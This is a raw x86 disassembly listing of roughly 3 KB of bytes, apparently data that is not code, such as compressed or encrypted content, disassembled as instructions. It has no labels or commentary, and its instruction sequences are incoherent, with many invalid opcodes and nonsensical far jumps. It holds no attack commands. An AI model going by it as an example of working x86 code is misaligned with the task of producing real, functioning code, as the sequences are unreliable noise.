  420efe:	fistp  WORD PTR [eax+ebp*4-0xa]
  420f02:	pusha  
  420f03:	jns    0x420f11
  420f05:	int    0xbb
  420f07:	mov    dh,0xca
  420f09:	inc    ecx
  420f0a:	fidiv  WORD PTR [esi-0x2]
  420f0d:	(bad)  
  420f0f:	pop    eax
	...
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x10b698ef]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	mov    bl,0xe6
  420f8e:	or     edx,DWORD PTR [ebx]
  420f90:	sub    ebp,ebx
  420f92:	ins    DWORD PTR es:[edi],dx
  420f93:	xchg   edx,eax
  420f94:	inc    ebp
  420f95:	rcl    BYTE PTR [esi+edx*4+0x36e619cc],0xca
  420f9d:	jl     0x420f82
  420f9f:	loope  0x420fff
  420fa1:	scas   al,BYTE PTR es:[edi]
  420fa2:	xor    edi,esp
  420fa4:	fisub  WORD PTR [esp+esi*4]
  420fa7:	fbld   TBYTE PTR [edi]
  420fa9:	addr16 mov ds:0x48fb,eax
  420fad:	rcl    BYTE PTR [ebp+0x21],cl
  420fb0:	aam    0x49
  420fb2:	jbe    0x420f38
  420fb4:	xchg   BYTE PTR [ebp+0x5266dc0],bh
  420fba:	mov    ecx,0x7d846e00
  420fbf:	dec    ebp
  420fc0:	fs mov edx,0x1afa308d
  420fc6:	jg     0x420faf
  420fc8:	mov    esi,0xba2dda9c
  420fcd:	push   0xffffffc7
  420fcf:	(bad)  
  420fd0:	out    dx,eax
  420fd1:	cli    
  420fd2:	lods   al,BYTE PTR ds:[esi]
  420fd3:	adc    al,0xd
  420fd5:	jge    0x420fa1
  420fd7:	mov    ebx,0xef7e7b04
  420fdc:	arpl   WORD PTR [edi+0x6],bx
  420fdf:	xor    ecx,0xffffff8d
  420fe2:	rol    BYTE PTR ds:0xc7e73b9,0x87
  420fe9:	inc    esp
  420fea:	retf   0x5238
  420fed:	xor    al,0x55
  420fef:	cdq    
  420ff0:	dec    esp
  420ff1:	sub    eax,0xecb05ee8
  420ff6:	in     eax,0x93
  420ff8:	mov    cl,0x7c
  420ffa:	and    al,BYTE PTR [ebx-0x3f]
  420ffd:	mov    gs,eax
  420fff:	sub    ah,BYTE PTR [esp-0x226f9d17]
  421006:	pushw  0xf8ef
  42100a:	shr    DWORD PTR [ebx],cl
  42100c:	fs int3 
  42100e:	inc    edx
  42100f:	ret    0xe376
  421012:	sahf   
  421013:	xor    al,0xaf
  421015:	jae    0x42102a
  421017:	(bad)  
  421018:	mov    ah,0xdf
  42101a:	test   BYTE PTR [edx+0x16cf38de],0x22
  421021:	push   DWORD PTR [edi-0x2fbdd577]
  421027:	in     al,0x53
  421029:	sub    dh,BYTE PTR [edx]
  42102b:	cmp    al,0xcf
  42102d:	pop    es
  42102e:	cmp    BYTE PTR [esi-0x78c251e8],dh
  421034:	xor    eax,0x77d676e1
  421039:	sub    ecx,DWORD PTR ss:[esi+0x514732ff]
  421040:	cmp    cl,BYTE PTR [ecx+esi*4-0x6e70abaa]
  421047:	push   ebp
  421048:	cmp    BYTE PTR [ebx+0x58],ah
  42104b:	mov    bl,0x45
  42104d:	mov    cl,0x1d
  42104f:	xchg   edi,eax
  421050:	popf   
  421051:	sbb    al,0xda
  421053:	push   esp
  421054:	mov    esi,0xace9e6fb
  421059:	mov    DWORD PTR [eax-0xab9b0c],edi
  42105f:	xor    ebp,DWORD PTR ds:0x6efc7c48
  421065:	mov    bh,BYTE PTR cs:[esi]
  421068:	sub    BYTE PTR [ebx-0x56c3cd4e],dh
  42106e:	sar    DWORD PTR [ecx+0x6cf49584],cl
  421074:	push   eax
  421075:	es in  al,dx
  421077:	mov    esp,0x762a2882
  42107c:	lods   eax,DWORD PTR ds:[esi]
  42107d:	dec    ch
  42107f:	jo     0x421034
  421081:	in     eax,0x10
  421083:	imul   eax,ebx,0xffffffca
  421086:	scas   al,BYTE PTR es:[edi]
  421087:	in     al,dx
  421088:	push   cs
  421089:	mov    dl,BYTE PTR [edx+esi*8+0x6a]
  42108d:	shr    DWORD PTR [edx-0x35],0x0
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ?,ebp
  421101:	sti    
  421102:	in     al,dx
  421103:	mov    cl,BYTE PTR [eax+eiz*2]
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	mov    bh,0xbd
  42110e:	(bad)  [ebx+ebx*2-0x5b]
  421112:	icebp  
  421113:	aaa    
  421114:	adc    eax,0x64302577
  421119:	and    eax,0xb7356af6
  42111e:	mov    al,0xf
  421120:	mov    ds:0x5c2aed6,al
  421125:	xchg   bl,dh
  421127:	dec    ebp
  421128:	dec    DWORD PTR [edi+0x5ef05a88]
  42112e:	adc    al,BYTE PTR [esi+0x29]
  421131:	pop    ss
  421132:	popf   
  421133:	add    bh,BYTE PTR [edx]
  421135:	xchg   esi,eax
  421136:	daa    
  421137:	and    ecx,DWORD PTR [edi-0x2004dd0b]
  42113d:	jae    0x421171
  42113f:	inc    esp
  421140:	hlt    
  421141:	xor    DWORD PTR [esi-0x55],esi
  421144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421146:	jbe    0x42110a
  421148:	aaa    
  421149:	jmp    0xbfd9a21e
  42114e:	dec    edi
  42114f:	int3   
  421150:	mov    esp,0xdfba88ac
  421155:	add    edx,DWORD PTR [ebx]
  421157:	out    0xa1,al
  421159:	imul   esi,DWORD PTR ds:0x1235fafe,0x7084905d
  421163:	push   0xc82b7365
  421168:	lods   eax,DWORD PTR ds:[esi]
  421169:	jae    0x4211d9
  42116b:	shl    BYTE PTR [eax-0x764297c],0x72
  421172:	sahf   
  421173:	jmp    0x421153
  421175:	inc    edx
  421176:	mov    bh,0x8
  421178:	pop    ebx
  421179:	mov    bl,0x4e
  42117b:	dec    eax
  42117c:	(bad)  
  42117d:	mov    bh,0x4f
  42117f:	pop    esi
  421180:	adc    ch,BYTE PTR [ebp+0x2f6ba9b]
  421186:	or     esp,DWORD PTR [eax+ecx*2]
  421189:	or     BYTE PTR [esi+edx*1],bh
  42118c:	xchg   esp,eax
  42118d:	jmp    0x11adb340
  421192:	cmp    eax,0x81a118ff
  421197:	(bad)  
  421198:	ins    BYTE PTR es:[edi],dx
  421199:	pushf  
  42119a:	adc    BYTE PTR [eax+0x29210e62],dh
  4211a0:	add    ecx,DWORD PTR [edi-0x35a94c37]
  4211a6:	scas   eax,DWORD PTR es:[edi]
  4211a7:	sbb    BYTE PTR [edx+edi*2+0x14c71ec2],bh
  4211ae:	test   al,0x35
  4211b0:	out    dx,al
  4211b1:	jg     0x421192
  4211b3:	imul   esp,DWORD PTR [esi+0x2c900944],0x1893504
  4211bd:	(bad)  
  4211be:	fdiv   st,st(6)
  4211c0:	and    DWORD PTR [edx+0x68],ebx
  4211c3:	jb     0x421157
  4211c5:	mov    al,ds:0xee05c499
  4211ca:	mov    cl,0xad
  4211cc:	dec    esp
  4211cd:	cmp    eax,0xb9b09e1c
  4211d2:	lds    edi,FWORD PTR [eax]
  4211d4:	hlt    
  4211d5:	push   es
  4211d6:	pop    ecx
  4211d7:	jo     0x4211a0
  4211d9:	push   es
  4211da:	leave  
  4211db:	jmp    0x70c5:0x12e65f7f
  4211e2:	cmp    al,0xc7
  4211e4:	pop    DWORD PTR [eax]
  4211e6:	jb     0x421218
  4211e8:	push   0xffffff94
  4211ea:	mov    al,0xf0
  4211ec:	pushf  
  4211ed:	scas   eax,DWORD PTR es:[edi]
  4211ee:	mov    al,0x0
  4211f0:	(bad)  
  4211f1:	mov    eax,ds:0x2500ccc4
  4211f6:	sub    DWORD PTR [ebp+0xb7cefe0],eax
  4211fc:	nop
  4211fd:	add    edx,DWORD PTR [ebx+0x4f0d23dd]
  421203:	adc    eax,0x894617bd
  421208:	into   
  421209:	pop    esi
  42120a:	add    al,0x59
  42120c:	ins    BYTE PTR es:[edi],dx
  42120d:	cmp    DWORD PTR [ecx+0x36],edx
	...
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0xca017ab3
  421282:	fld    DWORD PTR [eax]
  421284:	adc    BYTE PTR [ecx+0x1],ah
  421287:	add    BYTE PTR [ecx+eax*1],al
  42128a:	add    BYTE PTR [eax],al
  42128c:	add    al,0x6a
  42128e:	xchg   edx,eax
  421290:	mov    eax,ds:0xad345fab
  421295:	mov    edx,fs
  421297:	pop    eax
  421298:	icebp  
  421299:	(bad)  
  42129a:	mov    eax,0x40a9d909
  42129f:	fstp   QWORD PTR [ebx+0x4e]
  4212a2:	mov    ds,WORD PTR [ebx-0x2d]
  4212a5:	stos   DWORD PTR es:[edi],eax
  4212a6:	out    dx,al
  4212a7:	call   ebx
  4212a9:	mov    edx,0x7dba96
  4212ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212af:	add    al,0x9f
  4212b1:	pop    edx
  4212b2:	sub    bh,dl
  4212b4:	mov    eax,0x97f8922a
  4212b9:	pop    eax
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	mov    ebp,0x86170fb4
  4212c0:	fild   QWORD PTR [ecx+eax*4-0xe7f9e84]
  4212c8:	sub    al,0xf4
  4212ca:	adc    al,0xd8
  4212cc:	mov    ecx,0xc2aae6f5
  4212d1:	mov    esp,0x7af14f6d
  4212d6:	fcom   DWORD PTR [esi+ebx*4+0x7e]
  4212da:	xlat   BYTE PTR ds:[ebx]
  4212db:	adc    esp,esi
  4212dd:	js     0x4212ed
  4212df:	fisubr WORD PTR [ebx+0x6c]
  4212e2:	out    0x72,eax
  4212e4:	vsubps xmm1,xmm0,xmm7
  4212e8:	inc    esi
  4212e9:	jo     0x421351
  4212eb:	and    DWORD PTR [edx+esi*8],ecx
  4212ee:	jno    0x421348
  4212f0:	inc    ebx
  4212f1:	mov    ds:0xbe9153b0,eax
  4212f6:	in     eax,dx
  4212f7:	push   esp
  4212f8:	sbb    dh,bl
  4212fa:	imul   edi,DWORD PTR [ebx],0x43
  4212fd:	jo     0x42133a
  4212ff:	cmp    bl,BYTE PTR ds:[eax+0x34]
  421303:	cli    
  421304:	cmp    BYTE PTR [edi],cl
  421306:	and    eax,0x2aa258d0
  42130b:	sti    
  42130c:	push   esi
  42130d:	pop    edi
  42130e:	jl     0x4212d8
  421310:	stos   DWORD PTR es:[edi],eax
  421311:	jnp    0x4212c5
  421313:	(bad)  
  421315:	imul   edx,DWORD PTR [edx-0x1551c0e7],0x381a3bdf
  42131f:	ins    BYTE PTR es:[edi],dx
  421320:	das    
  421321:	and    BYTE PTR [eax],cl
  421323:	xor    al,0xf5
  421325:	in     eax,dx
  421326:	mov    eax,0xb6ec4039
  42132b:	pusha  
  42132c:	cwde   
  42132d:	sbb    al,0x42
  42132f:	icebp  
  421330:	shl    BYTE PTR [ebp-0x47648dae],cl
  421336:	or     bl,BYTE PTR [edx-0x51]
  421339:	lock es xor ch,dh
  42133d:	cmp    eax,0xd7c622d9
  421342:	pop    esi
  421343:	push   ebx
  421344:	nop
  421345:	lea    esi,[esi]
  421347:	xchg   DWORD PTR [ecx-0x695ebf39],eax
  42134d:	into   
  42134e:	test   esi,ebp
  421350:	and    DWORD PTR [eax],0xb2218230
  421356:	bound  edi,QWORD PTR [edx+0x32c4a6a]
  42135c:	sar    BYTE PTR [ecx+0x6a],1
  42135f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421360:	daa    
  421361:	adc    edx,DWORD PTR [ebp-0x4ef6571d]
  421367:	dec    ebp
  421368:	fbld   TBYTE PTR [ebx]
  42136a:	call   0xfc46:0x32607f18
  421371:	fiadd  WORD PTR [ecx+0x17]
  421374:	xchg   esp,eax
  421375:	iret   
  421376:	fistp  DWORD PTR [ebp-0x1092d6fc]
  42137c:	or     eax,0x42e423e
  421381:	push   ss
  421382:	adc    DWORD PTR [ebp+0x61c5b95d],ebp
  421388:	test   BYTE PTR [edi],0xad
  42138b:	lods   eax,DWORD PTR ds:[esi]
  42138c:	mov    edi,0xefcf82
	...
  4213f1:	add    BYTE PTR [eax],al
  4213f3:	add    dh,bh
  4213f5:	(bad)  
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x1d60f49f]
  421402:	mov    dl,0xfb
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	fwait
  42140d:	dec    edi
  42140e:	(bad)  
  42140f:	push   ebx
  421410:	popf   
  421411:	sub    ch,bh
  421413:	adc    al,0x3e
  421415:	jo     0x42143b
  421417:	sub    BYTE PTR [ecx+0x35],0x48
  42141b:	adc    esp,eax
  42141d:	mov    ebx,0xd125ccaa
  421422:	nop
  421423:	mov    esi,0x199b277e
  421428:	ja     0x421456
  42142a:	sub    ebx,DWORD PTR [ebx+0x18]
  42142d:	popa   
  42142e:	pop    ds
  42142f:	stos   DWORD PTR es:[edi],eax
  421430:	out    dx,al
  421431:	shl    BYTE PTR [eax+0x523d4f7d],0x46
  421438:	add    dl,ch
  42143a:	jmp    0x368917ab
  42143f:	dec    edx
  421440:	adc    al,0xe1
  421442:	int    0xf3
  421444:	repz repnz icebp 
  421447:	popf   
  421448:	ss in  eax,dx
  42144a:	push   eax
  42144b:	mov    dh,0x62
  42144d:	(bad)  
  42144e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42144f:	scas   al,BYTE PTR es:[edi]
  421450:	(bad)  
  421451:	mov    ch,0xfd
  421453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421454:	hlt    
  421455:	pop    ss
  421456:	pop    ds
  421457:	dec    ecx
  421458:	sbb    ch,bl
  42145a:	push   ebx
  42145b:	pushf  
  42145c:	stos   DWORD PTR es:[edi],eax
  42145d:	sbb    edi,DWORD PTR [ebp+0x3f95a76b]
  421463:	sbb    ax,ax
  421466:	jno    0x4214c5
  421468:	outs   dx,DWORD PTR ds:[esi]
  421469:	(bad)  
  42146b:	cwde   
  42146c:	call   0xfb64240
  421471:	fmul   DWORD PTR es:[ebx]
  421474:	xor    esp,ecx
  421476:	push   es
  421477:	daa    
  421478:	mov    ds:0x69fa5746,al
  42147d:	fadd   st,st(7)
  42147f:	mov    esp,0x45237325
  421484:	call   0xc0fd:0x8dd9f946
  42148b:	int    0xa7
  42148d:	fs call 0x3276:0x5e4b76f9
  421495:	adc    dl,BYTE PTR [ebp-0x39]
  421498:	fdiv   QWORD PTR ds:0xde657d15
  42149e:	lds    ebx,FWORD PTR [eax+0x52]
  4214a1:	fisttp QWORD PTR [ebx+0x7a]
  4214a4:	lahf   
  4214a5:	(bad)  
  4214a6:	xor    al,0xc9
  4214a8:	or     BYTE PTR [esp+eax*8-0x55],bh
  4214ac:	(bad)
  4214b0:	push   ebp
  4214b1:	inc    ebp
  4214b2:	xchg   BYTE PTR [ebx],ah
  4214b4:	jnp    0x42143f
  4214b6:	push   ecx
  4214b7:	mov    bl,0xf1
  4214b9:	mov    bl,0xa
  4214bb:	adc    BYTE PTR [eiz*8+0x6f1b0f55],0x9d
  4214c3:	mov    edi,DWORD PTR [ecx-0x7b21815]
  4214c9:	push   esi
  4214ca:	mov    fs,WORD PTR [edi+ebx*2+0x7b867a77]
  4214d1:	loopne 0x4214b7
  4214d3:	cmp    al,0x13
  4214d5:	xchg   esi,eax
  4214d6:	or     ebx,DWORD PTR [ebx+0x4ed0922]
  4214dc:	dec    esp
  4214dd:	jne    0x42152b
  4214df:	dec    edi
  4214e0:	loopne 0x4214d4
  4214e2:	xchg   ebp,eax
  4214e3:	push   esp
  4214e4:	pop    ebp
  4214e5:	mov    DWORD PTR [ebx+0x4d],edx
  4214e8:	addr16 jl 0x42155d
  4214eb:	mov    esp,0xf73766df
  4214f0:	cmp    ecx,DWORD PTR [ebx+0x47aba99e]
  4214f6:	inc    edx
  4214f7:	or     dl,BYTE PTR [ebx+0x73]
  4214fa:	push   ds
  4214fb:	leave  
  4214fc:	xor    DWORD PTR [edi+edi*1+0x13],ebp
  421500:	not    BYTE PTR [edi]
  421502:	mov    dl,0xa9
  421504:	lock sub DWORD PTR [eax-0x57f6d67b],edi
  42150b:	pop    esi
  42150c:	fisttp QWORD PTR [ebp+0xfaf7]
	...
  421572:	add    BYTE PTR [eax],al
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x60fdbd4c],bp
  421582:	xor    BYTE PTR ds:0x16318,al
  421588:	add    al,0x1
  42158a:	add    BYTE PTR [eax],al
  42158c:	jbe    0x42159e
  42158e:	cmp    dh,BYTE PTR [ecx+0x5ad3f21c]
  421594:	(bad)  
  421595:	loope  0x4215f1
  421597:	add    ch,dh
  421599:	jo     0x421602
  42159b:	pop    esp
  42159c:	pop    esi
  42159d:	sti    
  42159e:	xchg   edx,eax
  42159f:	fisub  DWORD PTR [esi-0x1b]
  4215a2:	dec    ecx
  4215a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215a4:	mov    WORD PTR [edi+0x8e73c8c],cs
  4215aa:	repz xchg ecx,eax
  4215ac:	cmc    
  4215ad:	in     eax,0x94
  4215af:	mov    dl,0xa5
  4215b1:	and    edi,DWORD PTR [edi-0x76]
  4215b4:	cmp    BYTE PTR [ecx+0x71411514],dl
  4215ba:	push   edi
  4215bb:	out    dx,al
  4215bc:	nop
  4215bd:	mov    al,0x30
  4215bf:	shr    DWORD PTR [ebx],0x0
  4215c2:	repnz and al,0xf4
  4215c5:	jae    0x4215f0
  4215c7:	push   ebp
  4215c8:	inc    eax
  4215c9:	mov    ebp,0x3b7e4f04
  4215ce:	jno    0x42158a
  4215d0:	ret    0x1f7a
  4215d3:	test   eax,0xd397c4e8
  4215d8:	mov    ?,eax
  4215da:	push   ebp
  4215db:	ds jge 0x4215d5
  4215de:	mov    edi,0xf8bba1c4
  4215e3:	sbb    edx,esi
  4215e5:	xor    DWORD PTR [ebx+0x55],ebx
  4215e8:	inc    ecx
  4215e9:	arpl   WORD PTR [ecx],sp
  4215eb:	push   ecx
  4215ec:	or     BYTE PTR [ecx],al
  4215ee:	push   ds
  4215ef:	test   eax,0xcb80daaf
  4215f4:	inc    edi
  4215f5:	xchg   edi,eax
  4215f6:	int    0x1a
  4215f8:	aas    
  4215f9:	(bad)  
  4215fa:	adc    ch,BYTE PTR [edi+ebp*1-0x53]
  4215fe:	push   DWORD PTR [ebx+ebx*8+0x4e91b2db]
  421605:	clc    
  421606:	dec    ebp
  421607:	and    dh,bl
  421609:	mov    eax,0x85b8a60e
  42160e:	pop    ecx
  42160f:	add    eax,0xd23bdf6f
  421614:	cdq    
  421615:	ficomp DWORD PTR [eax]
  421617:	repz mov bh,0xb6
  42161a:	je     0x421670
  42161c:	jmp    0x7f1f:0x9a9e94ce
  421623:	rcl    DWORD PTR [esi],cl
  421625:	je     0x4215de
  421627:	ins    BYTE PTR es:[edi],dx
  421628:	repz mov ebp,0xecf3ca05
  42162e:	sub    eax,0x31ed7045
  421633:	mov    edx,0x91e2132e
  421638:	and    ah,BYTE PTR [esi+0x3afaae0e]
  42163e:	imul   esp,DWORD PTR [eax-0x28],0x3d328126
  421645:	xchg   esp,eax
  421646:	jbe    0x421656
  421648:	and    edi,DWORD PTR [edx-0x51]
  42164b:	fmul   DWORD PTR [ebp-0x3b3e7d2c]
  421651:	mov    dl,0x87
  421653:	aad    0x30
  421655:	jge    0x421657
  421657:	pop    edi
  421658:	mov    ds:0x859ecc9f,eax
  42165d:	mov    ecx,0xc672352b
  421662:	sbb    DWORD PTR [esi-0x33976902],edx
  421668:	pop    ecx
  421669:	jge    0x42163f
  42166b:	stc    
  42166c:	lds    ebx,FWORD PTR [esp+ecx*8+0x725b0cc8]
  421673:	in     al,0xad
  421675:	(bad)  
  421676:	mov    ds:0x48fe2f79,eax
  42167b:	ins    DWORD PTR es:[edi],dx
  42167c:	pop    ss
  42167d:	or     bh,BYTE PTR [esp+esi*8]
  421680:	nop
  421681:	into   
  421682:	div    BYTE PTR [eax+eiz*2]
  421685:	into   
  421686:	repnz test al,0xf7
  421689:	or     ecx,edx
  42168b:	mov    esp,0x2f59414e
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	fwait
  421701:	pop    ecx
  421702:	mov    ah,0x46
  421704:	sbb    al,0x64
  421706:	add    DWORD PTR [eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	cli    
  42170d:	stos   DWORD PTR es:[edi],eax
  42170e:	stos   DWORD PTR es:[edi],eax
  42170f:	mov    cl,0xdd
  421711:	push   edx
  421712:	sbb    eax,0xb4fe4e73
  421717:	xor    BYTE PTR [edx+esi*1+0x6481acb3],0x37
  42171f:	mov    esp,0xb345e9a8
  421724:	xchg   ebx,eax
  421725:	mov    edi,0x735c6bc2
  42172a:	scas   eax,DWORD PTR es:[edi]
  42172b:	(bad)  
  42172c:	jmp    0x6cad:0x9a44d40a
  421733:	or     al,0xd2
  421735:	sbb    DWORD PTR [ebx+edx*1-0x1ae48667],esp
  42173c:	cmp    BYTE PTR [edx-0x1823950e],al
  421742:	add    DWORD PTR [edx],edi
  421744:	push   ecx
  421745:	mov    bl,0xc5
  421747:	pop    edi
  421748:	mov    cl,0x66
  42174a:	inc    ebx
  42174b:	push   0xffffffab
  42174d:	(bad)  
  42174e:	and    eax,0x3c9a73ae
  421753:	imul   eax,DWORD PTR [ebp-0x1e2d2169],0xecbb6989
  42175d:	sub    DWORD PTR [ebp+0x3a0aa82c],edi
  421763:	aaa    
  421764:	push   edx
  421765:	pop    edx
  421766:	push   es
  421767:	aas    
  421768:	shr    ecx,0xfb
  42176b:	ret    0x6ba9
  42176e:	std    
  42176f:	inc    BYTE PTR [esi-0xe]
  421772:	out    dx,al
  421773:	bound  esi,QWORD PTR [esi+edi*4+0x1c]
  421777:	dec    edi
  421778:	out    dx,al
  421779:	add    DWORD PTR [ebx+0x29],ecx
  42177c:	dec    esp
  42177d:	es xchg esp,eax
  42177f:	mov    esp,0xc9639f9b
  421784:	dec    esp
  421785:	jno    0x421766
  421787:	shl    BYTE PTR [ebx+0x47dcb32c],0x76
  42178e:	stc    
  42178f:	mov    bh,0xae
  421791:	sar    cl,1
  421793:	loope  0x4217bb
  421795:	rcr    ebp,cl
  421797:	mov    ebp,DWORD PTR [esi]
  421799:	stc    
  42179a:	adc    cl,0xd4
  42179d:	mov    DWORD PTR [ebp+0x70],edx
  4217a0:	cs fs (bad) 
  4217a3:	mov    DWORD PTR [esi],esi
  4217a5:	clc    
  4217a6:	push   cs
  4217a7:	xchg   edi,eax
  4217a8:	or     BYTE PTR [esi+0x40],ch
  4217ab:	sub    bl,BYTE PTR [ecx+0x3e]
  4217ae:	fnstenv [ecx+ebp*4-0x2cb01d5c]
  4217b5:	adc    bh,bh
  4217b7:	xlat   BYTE PTR ds:[ebx]
  4217b8:	pop    es
  4217b9:	retf   
  4217ba:	push   esi
  4217bb:	int3   
  4217bc:	imul   edx,DWORD PTR [edx+0x31d3a28c],0xffffff92
  4217c3:	sub    al,0xdd
  4217c5:	mov    BYTE PTR ds:0xa1fb9c52,al
  4217cb:	test   eax,0x3c7a3967
  4217d0:	xchg   ebp,eax
  4217d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217d2:	stos   DWORD PTR es:[edi],eax
  4217d3:	jmp    0x421839
  4217d5:	add    edx,ebx
  4217d7:	mov    bl,0xf4
  4217d9:	dec    edx
  4217da:	and    BYTE PTR [eax-0x5fb3771e],bl
  4217e0:	cld    
  4217e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217e2:	xchg   DWORD PTR [ecx+0x30],eax
  4217e5:	push   esi
  4217e6:	ret    
  4217e7:	adc    DWORD PTR [esi],esi
  4217e9:	jge    0x42177b
  4217eb:	jo     0x4217d3
  4217ed:	pop    ebx
  4217ee:	aaa    
  4217ef:	or     ch,0xa4
  4217f2:	or     BYTE PTR [edi-0x3e],bh
  4217f5:	cmp    ebx,esp
  4217f7:	inc    ebx
  4217f8:	jl     0x4217ad
  4217fa:	(bad)  
  4217fb:	and    dh,BYTE PTR [edi-0xd]
  4217fe:	mov    bl,0x4c
  421801:	mov    al,BYTE PTR [edx-0xc]
  421804:	jle    0x421826
  421806:	pop    edi
  421807:	(bad)  
  421808:	mov    esi,0x62c976eb
  42180d:	add    al,0xd1
  42180f:	mov    ecx,0x0
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	icebp  
  421881:	(bad)  
  421882:	cmp    DWORD PTR [eax+eiz*1+0x4000165],edi
  421889:	add    DWORD PTR [eax],eax
  42188b:	add    BYTE PTR [ebp+0x585a02fc],bl
  421891:	bnd je 0x42183d
  421894:	dec    ebx
  421895:	ficom  DWORD PTR [edi-0x27]
  421898:	or     al,0xbf
  42189a:	pop    ebp
  42189b:	imul   esp,ecx,0xffffffe3
  42189e:	dec    eax
  42189f:	out    dx,eax
  4218a0:	aad    0x4f
  4218a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218a3:	or     ebp,DWORD PTR [ebx+0x2]
  4218a6:	cmp    al,0x5f
  4218a8:	add    BYTE PTR [ebx+0x5a],ch
  4218ab:	mov    ch,0xf3
  4218ad:	daa    
  4218ae:	pop    edi
  4218af:	jns    0x421854
  4218b1:	ja     0x42190f
  4218b3:	clc    
  4218b4:	js     0x421904
  4218b6:	dec    edi
  4218b7:	int3   
  4218b8:	cld    
  4218b9:	xor    dh,BYTE PTR [ecx-0x2a643938]
  4218bf:	dec    ebx
  4218c0:	push   0xffffffe0
  4218c2:	or     edx,DWORD PTR [edx]
  4218c4:	adc    al,0x2
  4218c6:	lahf   
  4218c7:	loopne 0x4218ea
  4218c9:	in     eax,dx
  4218ca:	mov    edi,DWORD PTR [eax]
  4218cc:	js     0x42186f
  4218ce:	loope  0x42186c
  4218d0:	fldenv ds:0x19ace66d
  4218d6:	(bad)  
  4218d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218d9:	jo     0x421937
  4218db:	pushf  
  4218dc:	xchg   ebx,eax
  4218dd:	cdq    
  4218de:	mov    bh,0x2c
  4218e0:	cmp    dl,BYTE PTR [edi+0x3d]
  4218e3:	retf   
  4218e4:	cmp    DWORD PTR [eax+ecx*1+0x43],edi
  4218e8:	into   
  4218e9:	and    ah,BYTE PTR [esi+0x7e971e88]
  4218ef:	or     eax,0x39371d31
  4218f4:	cdq    
  4218f5:	or     al,0x30
  4218f7:	imul   ebx,DWORD PTR ds:0xa397cd0c,0xffffff95
  4218fe:	add    DWORD PTR [edi-0x4fc75f2e],0xb1c1664a
  421908:	ret    
  421909:	xor    ebp,ebp
  42190b:	pop    ecx
  42190c:	sub    eax,0x29516182
  421911:	ds pusha 
  421913:	cli    
  421914:	rcr    ch,cl
  421916:	jge    0x421931
  421918:	sti    
  421919:	js     0x421950
  42191b:	push   esi
  42191c:	out    0x43,al
  42191e:	mov    ebp,0xb5af62d3
  421923:	out    dx,eax
  421924:	fsubr  DWORD PTR [edx+ebp*8]
  421927:	xor    eax,0x3ebec2a6
  42192c:	mov    dl,0xff
  42192e:	mov    al,0xcd
  421930:	xchg   DWORD PTR ds:0xf42293fc,esp
  421936:	jnp    0x4219ae
  421938:	jmp    0xaf1ba95a
  42193d:	div    DWORD PTR [ecx-0x600496e9]
  421943:	retf   0x5669
  421946:	jno    0x42192c
  421948:	ret    0xe1ff
  42194b:	aad    0x82
  42194d:	das    
  42194e:	rol    BYTE PTR [ecx-0x14f284e1],cl
  421954:	mov    ds:0xe5aa275a,eax
  421959:	inc    esp
  42195a:	push   ecx
  42195b:	aas    
  42195c:	shl    edx,0x20
  42195f:	mov    ecx,0x94a2d999
  421964:	ds mov bl,0x8e
  421967:	adc    esp,DWORD PTR [edi]
  421969:	mov    esi,0xd332a7a6
  42196e:	call   0xad5:0x10330c5
  421975:	cdq    
  421976:	push   ds
  421977:	mov    ebx,0x592e4f7c
  42197c:	(bad)  
  42197d:	ret    
  42197e:	push   ebx
  42197f:	push   ebx
  421980:	stc    
  421981:	test   esp,edx
  421983:	aad    0x35
  421985:	mov    al,0x9d
  421987:	loop   0x4219df
  421989:	bound  eax,QWORD PTR [ebx+eax*4-0x48]
  42198d:	neg    cl
  42198f:	add    BYTE PTR [eax],0x0
	...
  4219f2:	add    BYTE PTR [eax],al
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	sbb    al,0xd4
  421a02:	aam    0xf3
